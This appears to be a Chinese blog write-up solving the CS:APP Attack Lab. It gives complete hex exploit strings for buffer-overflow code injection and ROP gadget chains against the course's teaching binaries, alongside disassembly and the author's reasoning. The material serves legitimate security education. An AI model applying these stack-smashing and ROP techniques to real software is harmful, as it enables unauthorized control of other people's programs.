---
title: Csapp-Attacklab题解
categories: Csapp
tags: Attacklab
abbrlink: f81059da
date: 2020-07-21 14:14:03
---

csapp lab系列：

- [Csapp\-Datalab 详解](https://ravenxrz.github.io/archives/2d758396.html)
- [Csapp-Bomblab 题解](https://ravenxrz.github.io/archives/7915569e.html)

本次lab: Attacklab

耽误了整整一个月没有做csapp的lab了. 忙着返校,忙着实验室的东西, 今天抽了点时间,总算是完成了第三个实验.

下面就记录下题解分析吧.

<!--more-->

## 0. 背景知识

1. 程序的内存分布,,内存分布https://ravenxrz.github.io/archives/2567fa35.html
2. 函数调用的过程, 主要要知道call和ret指令各自的工作. 
3. gdb调试,objdump反汇编
4. Buffer Overflow以及常用的阻止buffer overflow的方法
5. ROP攻击

其中,最重要的是,一定要了解stack frame的call和ret过程.

## 1. Phase 1

题目就给英文了

For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure. Function getbuf is called within CTARGET by a function test having the following C code:

```c
 void test()
 {
     int val;
     val = getbuf();
     printf("No exploit.
     Getbuf returned 0x%x\n", val);
 }
```

When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:

```c
 void touch1()
 {
     vlevel = 1;
     /* Part of validation protocol */
     printf("Touch1!: You called touch1()\n");
     validate(1);
     exit(0);
 }
```

Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

这个题目非常简单, 不需要注入攻击, 只需要利用 getbuf()将程序的控制权从test函数,转入到touch1函数即可.

利用`objdump -d`命令,反汇编ctarget看看:

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64w f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq   
  401991:	90                   	nop
  401992:	90                   	nop
  401993:	90                   	nop
  401994:	90                   	nop
  401995:	90                   	nop
  401996:	90                   	nop
  401997:	90                   	nop
  401998:	90                   	nop
  401999:	90                   	nop
  40199a:	90                   	nop
  40199b:	90                   	nop
  40199c:	90                   	nop
  40199d:	90                   	nop
  40199e:	90                   	nop
  40199f:	90                   	nop

00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

我将三个涉及到的东西提取了出来. 主要看getbuf和touch1函数.

对于getbuf来说, 我们看到汇编的第一句就是

```asm
sub $0x28,%rsp
```

也就是说, getbuf首先开辟了0x28的stack空间.

对于touch1来说,我们知道它的地址是:0x4017c0. 

好的,知道这两点,我们就可以写攻击代码了, 在写之前, 先画个示意图:

![image-20200720231159598](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720231159598.png)

说明:

1. 单元格中存放的是起始起始,一个内存单元8个字节
2. buffer由低到高写入

关键点是要 **覆盖test 401976**这个单元, 正常情况下,这里存放这从getbuf返回后,test函数中getbuf的下一行汇编指令. 要从test中抢夺函数控制权, 就需要覆盖这里. 那覆盖成什么样? 当然就是我们 touch1函数的首地址了, 另外需要注意机器的字节序(这里是小端序). 综上, 攻击代码如下:

```
/* question1: 填充40个字节后加入touch1的返回地址(小端序) */
00 00 00 00 00 00 00 00 /* 8 byte */
00 00 00 00 00 00 00 00 /* 8 byte */
00 00 00 00 00 00 00 00 /* 8 byte */
00 00 00 00 00 00 00 00 /* 8 byte */
00 00 00 00 00 00 00 00 /* 8 byte */
c0 17 40 00 00 00 00 00 /* touch1 address */
```

40 = 0x28

> 请注意, 之所以可以做,因为ctarget在汇编时关闭了 **stack随机和注入代码不可执行** 两个常用的阻止注入攻击的方法, 否则这个题就目前的知识来说是无解的.

## 2. Phase 2

题目:

Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function touch2 having the following C representation:

```c
void touch2(unsigned val)
{
    vlevel = 2;
     /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
	}
	exit(0);
}
```

Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.

题目的意思很简单, 接着题目1, 现在要跳转的函数是touch2, 只不过touch2需要一个参数val, val是cookie的值. 这里就要用到注入了, 如何生成注入代码,请参照 attack lab的write up的Appendix B.

说明:cookie在lab文件中有, 我这里它是 0x59b997fa.

关键点:

1. cookie值
2. rdi寄存器保存函数的第一个参数.

思路简单:

1. 设置rdi = cookie value
2. 跳转到touch2即可.

但是这里存在两个跳转, 1.跳转我们的注入代码的首地址.2.跳转到touch2. 画个图看看:

![image-20200720232843852](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720232843852.png)

也就是说,我们首先应该跳转到我们注入的代码的首地址, 然后注入代码执行过程中(红色的区域的某个部分),又跳转到touch2. 

跳转1很直观, 我们覆盖了原来的地址, 那跳转2如何实现?

这个就要理解清除call和ret指令的工作了, 简单说来:

1. call, %rsp-1, push当前执行指令的指令到%rsp所指的内存空间, 设置%rip为要跳转的函数的第一条指令地址.
2. ret, pop %rsp指向的内存空间的内容到 %rip, %rsp+1.

于是要实现跳转2, 我们只用push touch2的第一条指令的地址到$%rsp, %rsp-1即可. 其实也就一条命令:

```asm
push touch2_address
```

至于设置%rdi=cooike, 那就很直接了:

```asm
mov cookie_value, %rdi
```

结合两条指令, 写出汇编代码:

```asm
mov cookie_value, %rdi
push touch2_address
ret
```

更换为实际value, 并用objdump反汇编,最终可得答案:

```asm
/* question2: */
48 c7 c7 fa 97 b9 59 /* mov $0x59b997fa      %rdi 设置cooike */
68 ec 17 40 00       /* pushq  $0x4017ec     push touch2的地址 */
c3                   /* ret                  返回 */
/* 上面一共13个字节, buf一共40个字节所以需要填充 40-13=27个字节 */
00 00 00 00 00 00 00 00 /* 8 bytes */
00 00 00 00 00 00 00 00 /* 8 bytes */
00 00 00 00 00 00 00 00 /* 8 bytes */
00 00 00                /* 3 bytes */
78 dc 61 55 00 00 00 00 /* exploit string code 的开始地址（即get buf的栈地地址) */
```

一点题外话:

> 这个题思路很简单,但是我却做了差不多3个小时. 原因在于, 我对每个指令都补齐成了8个字节(也不知道脑袋怎么想的). 搞了1,2个小时 , gdb调试出来的指令和我写入的指令就是不同, 无奈取网上查答案, 发现思路是对的, 别人的代码却和我的不同, 要不就是 题目都和我不一样. 最后认真看了一个帖子才找到自己的问题. 
>
> 比如我将 c3指令,编码成了 c3 00 00 00 00 00 00 00 . 所以在运行时, 总是不对.

## 3. Phase 3

题目:

Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:

```c
/* Compare string to hex represention of unsigned value */
 int hexmatch(unsigned val, char *sval)
 {
     char cbuf[110];
     /* Make position of check string unpredictable */
     char *s = cbuf + random() % 100;
     sprintf(s, "%.8x", val);
     return strncmp(sval, s, 9) == 0;
 }

 void touch3(char *sval)
 {
     vlevel = 3;
     /*
     Part of validation protocol */
     if (hexmatch(cookie,sval)) {
         printf("Touch3!:
         You called touch3(\"%s\")\n", sval);
         validate(3);
     } else {
         printf("Misfire:
         You called touch3(\"%s\")\n", sval);
         fail(3);
     }
     exit(0);
 }

```

Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.

这个题目的几个关键点:

1. cooike的 string ascii码表示
2. cooike的string ascii码的存放以及 **存放位置的确定**
3. rdi指向 string 的存放地址.
4. touch3跳转

cooike的ascii码很简单, 对照ascii码表即可得:

```CQL
35 39 62 39 39 37 66 61 00 /* 9 bytes */ 
```

唯一值得注意的是, 要在末尾添加\0表示c 字符串的结束.

难点在于确定位置: 说说我做的时候遇到的问题:

之所以难以确定字符串存放的位置, 是因为后续的hexmatch和stringncmp函数会覆盖buf的stack空间.

- 我最初想的是, 将字符串存放在一个相对很低的位置, 让后续的两个函数不会产生覆盖. 但是这样的问题是, cooike string无法进行硬编码. 毕竟没有指令可以直接写字符串到内存中, 倒是可以一个个字符的写入, 但是这样我们的exploit string会过长, 于是这个方法废弃了.

- 说第二想法之前, 我们先看看后续的程序会对stack空间做些什么:

  ![image-20200721090502836](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090502836.png)

  那字符串到底放在哪里? 我尝试了将字符串放在了buf的stack顶端和低端, 如下两图:

  ![image-20200721090628772](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090628772.png)

  经过gdb调试,两者都会被覆盖, 所以这个方案也被pass掉了.

  继续思考, 放在内存的低端的确很容易被覆盖,因为hexmatch函数中有个随机从某个位置开始写入cbuf的操作, 所以低端是没法用的. 只能考虑高端, 高端是由 push压入regs导致的覆盖, 只要避免了这个就好了. 回忆以下push指令是如何工作的, 

  ```asm
  push reg
  ```

  reg被压入%rsp当前指向的内存空间, 然后%rsp-1

  所以我们可以直接继续覆盖, 看示意图:

![image-20200721091909441](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png)

可以得到注入代码:

```asm
/* question3: */
48 c7 c7 a8 dc 61 55 /* mov $0x5561dca8,%rdi 设置$rdi指向string内存地址 */
68 fa 18 40 00       /* pushq  $0x4018fa     push touch3的地址 */
c3                   /* ret                  返回 */
/* 上面一共13个字节, buf一共40个字节所以需要填充 40-13=27个字节 */
00 00 00 00 00 00 00 00 /* 8 bytes */
00 00 00 00 00 00 00 00 /* 8 bytes */
00 00 00 00 00 00 00 00 /* 8 bytes */
00 00 00                /* 3 bytes */
78 dc 61 55 00 00 00 00 /* exploit string code 的开始地址（即get buf的栈地地址) */
35 39 62 39 39 37 66 61 00 /* 继续覆盖为cookie string */
```

## 4. Phase 4

从这个阶段开始, 就是aop攻击的内容了. 所以在继续之前, 一定要知道rop攻击的理论基础. 

rop的背景是 在stack随机和注入不可能执行 等防止注入攻击手段下, 我们可以寻找text section中有效的代码片段, 这些片段通常都是以ret结尾, 找到这些指令后(一个这样的片段被称为一个gaddget), 通过stack frame入栈出栈原理,将这些gaddget串成一条链, 从而能够组成有用的攻击代码.

本题的背景是开启了 stack随机化和注入注入代码不可执行 两个功能的.

好,现在来看看phase4题目:

For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).
movq : The codes for these are shown in Figure 3A.
popq : The codes for these are shown in Figure 3B.
ret : This instruction is encoded by the single byte 0xc3.
nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single
byte 0x90. Its only effect is to cause the program counter to be incremented by 1.



![image-20200721093742135](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093742135.png)

![image-20200721093753166](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093753166.png)

所有可用指令, 我都高亮了.

注意点:

题目中提到的gadget farm是指在rtaget反汇编后, 我们的gaddget只能从start_farm段到end_farm段之间的所有指令中抽取. 这之间的指令为:

```asm
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	retq   

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq   

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	retq   

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq   

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	retq   

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq   

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq   

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq   

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	retq   

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq   

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq   

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq   

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	retq   

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq   

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq   

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq   

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	retq   

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	retq   

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq   

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq   

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	retq   

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq   

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq   

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	retq   

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq   

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq   
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop
```

2. rdi要如何设置为cookie
3. 如何跳转到touch2

我将所有可以用的指令都高亮了出来, 根据提示, 我们只需要只用Figure A和Figure B中的指令即可. 这里能够修改的rdi的只有:

```asm
mov $rax, $rdi
```

那问题转到\$rax了,再看能修改\$rax的:

```asm
mov $rsp, $rax 
pop $rax
```

显然,用pop的概率更大.

pop是将\$rsp当前指向的数据  pop 到 \$rax 上, 所以我们可得gaddget如下图:

![image-20200721093518556](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093518556.png)

知道这些, 我们只用到 rtaget的gaddgets_farm中找到对应的指令字节码即可, 最终可得:

```asm
/* 先填充40个字节 */
00 00 00 00 00 00 00 00 /* 8个字节 */
00 00 00 00 00 00 00 00 /* 8个字节 */
00 00 00 00 00 00 00 00 /* 8个字节 */
00 00 00 00 00 00 00 00 /* 8个字节 */
00 00 00 00 00 00 00 00 /* 8个字节 */
/* 写入gadgets */
ab 19 40 00 00 00 00 00 /* pop $rax */
fa 97 b9 59 00 00 00 00 /* cookie */
a2 19 40 00 00 00 00 00 /* mov $rax,$rdi */
ec 17 40 00 00 00 00 00 /* touch2 地址 */
```

## 5. Phase 5

Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string epresentation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.

To solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions start_farm and end_farm. In addition to the gadgets used in Phase 4, this expanded farm includes the encodings of different movl instructions, as shown in Figure 3C. The byte sequences in this part of the farm also contain 2-byte instructions that serve as functional nops, i.e., they do not change any register or memory values. These include instructions, shown in Figure 3D, such as andb %al,%al, that operate on the low-order bytes of some of the registers but do not change their values.

这个题目的确是个比较坑的题目, 因为从前文做到现在, 很容易让人联想到, 我所有需要的gaddgets都是依据表格中给出的指令, 然后到farm对比中得到的.  如果你是这样想的, 那肯定是做不出来的了. 因为你会发现, 不论怎么做, 你都无法使rdi指向 cookie的string数据内存地址. 

本题的关键是如下这段代码:

```asm
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```

lea指令, 实现了相加功能, 一旦能实现相加功能, 我们就能使 rdi = cookie 的string内存地址了. 至于为什么, 我们一步步分析.

本题起始就是phase3的rop版. 回忆下phase3中我们要做的工作的几个关键点:

1. cooike的 string ascii码表示
2. cooike的string ascii码的存放以及 **存放位置的确定**
3. rdi指向 string 的存放地址.
4. touch3跳转

回忆以下我们在phase3中是怎么做的?看看下面的示意图.

![image-20200721091909441](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png)

从这张图中, 我们可以考虑一下如果运用aop , string到底放在哪里合适? 我们的前提是任何时候都不能覆盖string.

**显然 string 依然应该放内存中的最高位. 因为栈是往下push的.** 

好, 那什么时候跳转到touch3? 

当然是我们确定rdi已经指向了string 内存地址之后.

所以touch3 应该在 rdi赋值 指令之后.

现在唯一的问题就剩下, rdi如何赋值?

这时候就需要逆向思维了, 查看表格, 能够修改rdi的有哪些?

仅有两条:

```asm
mov $rax, $rdi
movl $eax, $edi
```

要知道, mov是将一个寄存器的值直接赋值给另一个寄存器的, 而在本次实验中, stack是随机化的, 我们不可能固定 string 字符串的内存位置, **所以可以使用相对偏移量来做**, 我们能确定的是getbuf函数返回后, $rsp的位置. 那么有:
$$
cookie\_value\_address = $rsp + offset
$$
应该注意到, $rdi一定会在最后被赋值一次, 因为rdi才是函数调用的第一个参数. 那如果去构造上面这个公式呢? 这就又需要逆向思维了?

谁能修改 rdi? –> rax可以.

谁能修该 rax? –> rsp 和 pop指令

rax可以修改谁? --> 可以修改rdi, edx

edx可以修改谁? -->  可以修改ecx

ecx可以修改谁? --> 可以修改esi

再结合前文的lea指令

```asm
lea    (%rdi,%rsi,1),%rax
```

rax = rdi + rsi

这样, 所有的条件都凑齐了.

画个示意图:

![image-20200721100554201](https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721100554201.png)

于是可以有攻击代码:

```asm
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 前0x28个字符填充0x00 */
06 1a 40 00 00 00 00 00 /* mov $rsp,$rax */
c5 19 40 00 00 00 00 00 /* mov $rax,$rdi */
ab 19 40 00 00 00 00 00 /* pop $rax */
48 00 00 00 00 00 00 00 /* offset */
dd 19 40 00 00 00 00 00 /* movl $eax,$edx */
34 1a 40 00 00 00 00 00 /* movl $edx,$ecx */
63 1a 40 00 00 00 00 00 /* movl $ecx,$esi */
d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00 /* mov $rax,$rdi */
fa 18 40 00 00 00 00 00 /* touch3 地址 */
35 39 62 39 39 37 66 61 00 /* cookie value */
```

一个小tip: offset不用手算, 最先可以随便设置一个值,gdb debug到进入到我们的注入代码时候, 执行:

```asm
x /100xb $rsp
```

就可以看到cooike value所在的内存地址, 然后 用这个地址 - $rsp即可得到offset, 最后再修改一次攻击代码即可.

## 6. 尾语

这一个实验和上一个bomlab实验隔了整整一个月才做, 不过整体坐下来比bomblab简单得多, 总体来说, 加强了gdb调试能力, 加深对函数调用的过程, 了解了一些常用的代码注入攻击手段, 能够帮助我们写出更安全,健壮的代码.